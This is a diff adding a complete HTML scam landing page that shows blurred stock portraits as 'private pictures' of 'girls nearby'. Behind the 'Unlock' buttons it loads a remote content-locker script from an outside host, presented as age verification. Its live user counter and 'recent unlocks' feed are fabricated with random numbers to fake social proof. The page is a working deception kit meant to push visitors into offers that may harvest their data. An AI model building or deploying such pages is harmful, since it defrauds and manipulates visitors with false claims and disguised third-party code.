@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unlock Private Pictures</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .blurred { filter: blur(12px); transition: 0.3s ease-in-out; }
+    .profile:hover .blurred { filter: blur(6px); }
+    .modal { display: none; }
+    .modal.active { display: flex; }
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #ec4899;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
+  <div class="max-w-md w-full p-4">
+    <h1 class="text-2xl font-bold text-center mb-6">🔥 Girls Nearby Waiting For You 🔥</h1>
+
+    <!-- Profile Grid -->
+    <div class="grid grid-cols-2 gap-4">
+      <div class="profile relative">
+        <img src="https://randomuser.me/api/portraits/women/65.jpg" class="w-full h-48 object-cover rounded-xl blurred">
+        <div class="absolute inset-0 flex items-center justify-center">
+          <button onclick="openModal()" class="bg-pink-600 px-3 py-1 rounded-lg text-sm">Unlock</button>
+        </div>
+      </div>
+      <div class="profile relative">
+        <img src="https://randomuser.me/api/portraits/women/32.jpg" class="w-full h-48 object-cover rounded-xl blurred">
+        <div class="absolute inset-0 flex items-center justify-center">
+          <button onclick="openModal()" class="bg-pink-600 px-3 py-1 rounded-lg text-sm">Unlock</button>
+        </div>
+      </div>
+      <div class="profile relative">
+        <img src="https://randomuser.me/api/portraits/women/44.jpg" class="w-full h-48 object-cover rounded-xl blurred">
+        <div class="absolute inset-0 flex items-center justify-center">
+          <button onclick="openModal()" class="bg-pink-600 px-3 py-1 rounded-lg text-sm">Unlock</button>
+        </div>
+      </div>
+      <div class="profile relative">
+        <img src="https://randomuser.me/api/portraits/women/18.jpg" class="w-full h-48 object-cover rounded-xl blurred">
+        <div class="absolute inset-0 flex items-center justify-center">
+          <button onclick="openModal()" class="bg-pink-600 px-3 py-1 rounded-lg text-sm">Unlock</button>
+        </div>
+      </div>
+    </div>
+
+    <p class="text-center text-gray-400 mt-6 text-sm">
+      ⚠️ You must verify your age (18+) to view these private pictures.
+    </p>
+  </div>
+
+  <!-- Modal -->
+  <div id="lockerModal" class="modal fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50">
+    <div class="bg-gray-800 rounded-2xl p-6 max-w-md w-full relative shadow-lg">
+      <button onclick="closeModal()" class="absolute top-2 right-2 text-gray-400 hover:text-white text-xl">&times;</button>
+      <h2 class="text-lg font-bold text-center mb-4">🔒 Verify to Unlock</h2>
+      
+      <!-- Locker Area -->
+      <div id="lockerContainer" class="text-center"></div>
+
+      <!-- Fake Live Counter -->
+      <div id="liveCounter" class="mt-4 text-center text-sm text-gray-300">
+        👥 <span id="onlineUsers">37</span> users online now <br>
+        ✅ <span id="unlockedUsers">12</span> just unlocked private pics
+      </div>
+
+      <!-- Recent Activity Feed -->
+      <div id="activityFeed" class="mt-4 bg-gray-700 rounded-lg p-3 h-32 overflow-hidden text-xs text-gray-200 space-y-2">
+        <div class="flex items-center space-x-2">
+          <img src="https://randomuser.me/api/portraits/men/11.jpg" class="w-6 h-6 rounded-full">
+          <span>🇺🇸 User_Alex unlocked 18+ pics 2 mins ago</span>
+        </div>
+        <div class="flex items-center space-x-2">
+          <img src="https://randomuser.me/api/portraits/women/14.jpg" class="w-6 h-6 rounded-full">
+          <span>🇬🇧 User_Sophia unlocked 18+ pics 4 mins ago</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function openModal() {
+      document.getElementById("lockerModal").classList.add("active");
+
+      // Show fake loading first
+      document.getElementById("lockerContainer").innerHTML = `
+        <div id="loadingBox">
+          <div class="spinner"></div>
+          <p class="mt-3 text-sm text-gray-300">Loading verification system...</p>
+        </div>
+      `;
+
+      // After 3 sec, load locker
+      setTimeout(() => {
+        document.getElementById("lockerContainer").innerHTML = "";
+        if (!document.getElementById("afmlock")) {
+          let s = document.createElement("script");
+          s.src = "https://hubverify.com/cl/clocker.php?id=68bb9ae35b16c";
+          s.id = "afmlock";
+          document.body.appendChild(s);
+        }
+      }, 3000);
+    }
+
+    function closeModal() {
+      document.getElementById("lockerModal").classList.remove("active");
+    }
+
+    // Fake Live Counter auto update
+    let online = 37;
+    let unlocked = 12;
+    setInterval(() => {
+      online += (Math.random() > 0.5 ? 1 : -1);
+      if (online < 20) online = 20;
+      document.getElementById("onlineUsers").textContent = online;
+
+      if (Math.random() > 0.7) {
+        unlocked++;
+        document.getElementById("unlockedUsers").textContent = unlocked;
+      }
+    }, 4000);
+
+    // Fake Recent Activity Feed
+    const users = [
+      {name: "Alex", img: "https://randomuser.me/api/portraits/men/11.jpg", flag: "🇺🇸"},
+      {name: "Sophia", img: "https://randomuser.me/api/portraits/women/14.jpg", flag: "🇬🇧"},
+      {name: "Emma", img: "https://randomuser.me/api/portraits/women/22.jpg", flag: "🇨🇦"},
+      {name: "Liam", img: "https://randomuser.me/api/portraits/men/19.jpg", flag: "🇦🇺"},
+      {name: "Olivia", img: "https://randomuser.me/api/portraits/women/30.jpg", flag: "🇳🇿"},
+      {name: "Noah", img: "https://randomuser.me/api/portraits/men/28.jpg", flag: "🇩🇪"},
+      {name: "Mia", img: "https://randomuser.me/api/portraits/women/36.jpg", flag: "🇫🇷"},
+      {name: "James", img: "https://randomuser.me/api/portraits/men/44.jpg", flag: "🇮🇹"}
+    ];
+
+    function addActivity() {
+      const user = users[Math.floor(Math.random() * users.length)];
+      const minutes = Math.floor(Math.random() * 5) + 1;
+      const feed = document.getElementById("activityFeed");
+      const div = document.createElement("div");
+      div.className = "flex items-center space-x-2";
+      div.innerHTML = `
+        <img src="${user.img}" class="w-6 h-6 rounded-full">
+        <span>${user.flag} User_${user.name} unlocked 18+ pics ${minutes} mins ago</span>
+      `;
+      feed.prepend(div);
+      if (feed.children.length > 6) {
+        feed.removeChild(feed.lastChild);
+      }
+    }
+    setInterval(addActivity, 5000);
+  </script>
+</body>
+</html>
